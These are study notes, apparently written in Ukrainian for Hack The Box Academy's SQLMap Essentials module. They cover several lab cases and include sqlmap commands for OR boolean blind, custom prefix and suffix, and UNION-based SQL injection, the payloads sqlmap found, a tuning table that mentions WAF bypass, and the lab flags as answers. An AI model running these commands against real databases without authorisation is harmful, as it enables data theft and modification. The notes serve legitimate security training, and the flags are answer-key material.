# SQLMap — Advanced Injection Techniques (OR, Prefix/Suffix, UNION)

## Модуль
[SQLMap Essentials — Advanced SQLMap Usage](https://academy.hackthebox.com/app/module/58/section/695)
[SQLMap Essentials — Advanced Tuning](https://academy.hackthebox.com/app/module/58/section/526)

---

## Case 5 — OR Boolean-based Blind (GET)

**Проблема:** AND-based payloads не спрацьовують — потрібен `--risk=3` для OR payloads.

```bash
sqlmap -u "http://TARGET/case5.php?id=1" \
  --batch --dump -T flag5 \
  --risk=3 \
  --threads=5
```

> `--risk=3` вмикає OR-based payloads які можуть модифікувати дані — використовувати обережно на prod.

**Injection знайдена:**
Type: OR boolean-based blind
Payload: id=-2094 OR 7906=7906

**Flag:** `HTB{700_much_r15k_bu7_w0r7h_17}`

---

## Case 6 — Non-standard Boundaries (Prefix/Suffix)

**Проблема:** параметр `col` використовується всередині SQL з нестандартними дужками — стандартні payloads не спрацьовують.

**Вразливий запит (приблизно):**
```sql
SELECT (`col`) FROM table...
-- або
ORDER BY (`col`)
```

**Рішення — вказати prefix і suffix вручну:**
```bash
sqlmap -u 'http://TARGET/case6.php?col=id' \
  --prefix='`) ' \
  --suffix='-- -' \
  --batch --dump -T flag6 \
  -D testdb --threads=5
```

**Injection знайдена:**
Type: time-based blind (heavy query)
Payload: col=id`) AND 7336=(SELECT COUNT(*) FROM ...)-- -

> `--prefix` і `--suffix` вказують що підставляти ДО і ПІСЛЯ payload.
> Визначається вручну аналізом SQL error або підказкою.

**Flag:** `HTB{v1nc3_mcm4h0n_15_4570n15h3d}`

---

## Case 7 — UNION-based (примусово)

**Проблема:** сторінка підтримує тільки UNION-based injection — треба явно вказати техніку і кількість колонок.

```bash
sqlmap -u "http://TARGET/case7.php?id=1" \
  --technique=U \
  --union-cols=5 \
  --no-cast \
  --batch --dump -T flag7 \
  -D testdb --threads=5
```

**Injection знайдена:**
Type: UNION query — 5 columns
Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(...),NULL-- jDwr

**Flag:** `HTB{un173_7h3_un173d}`

---

## Відповіді

| Q | Case | Техніка | Flag |
|---|------|---------|------|
| Q1 | Case 5 | OR Boolean-blind (`--risk=3`) | `HTB{700_much_r15k_bu7_w0r7h_17}` |
| Q2 | Case 6 | Prefix/Suffix (`--prefix='`) '`) | `HTB{v1nc3_mcm4h0n_15_4570n15h3d}` |
| Q3 | Case 7 | UNION (`--technique=U --union-cols=5`) | `HTB{un173_7h3_un173d}` |

---

## Ключові параметри tuning

| Параметр | Коли використовувати |
|----------|---------------------|
| `--risk=3` | OR-based payloads — коли AND не спрацьовує |
| `--level=5` | Тестувати headers, cookies, рідкісні injection points |
| `--prefix='...'` | Нестандартні границі SQL виразу |
| `--suffix='...'` | Закрити SQL вираз після payload |
| `--technique=U` | Тільки UNION-based |
| `--union-cols=N` | Вказати кількість колонок для UNION |
| `--no-cast` | Вимкнути cast типів (іноді допомагає) |
| `--tamper=...` | WAF bypass через трансформацію payload |

## Як визначити prefix/suffix
1. Викликати SQL error: ?col=id' → дивитись на error message
2. Аналізувати відповідь — чи змінюється при різних символах
3. Підказка від задачі / writeup
4. Типові варіанти:
' → простий рядок
) → закрити функцію
) → закрити підзапит
ORDER BY col → col без quotes

# SQLMap — Basic GET Injection (Case #1)

## Модуль
[SQLMap Essentials — Running SQLMap on HTTP Requests](https://academy.hackthebox.com/app/module/58/section/510)

## Команда

```bash
sqlmap -u "http://TARGET/case1.php?id=1" \
  --batch \
  --dump -T flag1 -D testdb \
  --threads=5
```

**Flag:** `HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}`

## Знайдені injection типи (всі 4+1)

| Тип | Title |
|-----|-------|
| Boolean-based blind | AND boolean-based blind - WHERE clause |
| Error-based | MySQL >= 5.0 FLOOR error-based |
| Stacked queries | MySQL >= 5.0.12 stacked queries |
| Time-based blind | MySQL >= 5.0.12 AND SLEEP |
| **UNION query** | Generic UNION - 6 columns ← найшвидший |

## Ключові параметри ефективності

```bash
-D testdb      # вказати конкретну БД → пропускає enumeration
-T flag1       # вказати конкретну таблицю → пропускає --tables
--batch        # не питати підтверджень
--threads=5    # паралельні запити
```

> Без `-D` і `-T` sqlmap спочатку enumерує всі БД і таблиці — значно повільніше.
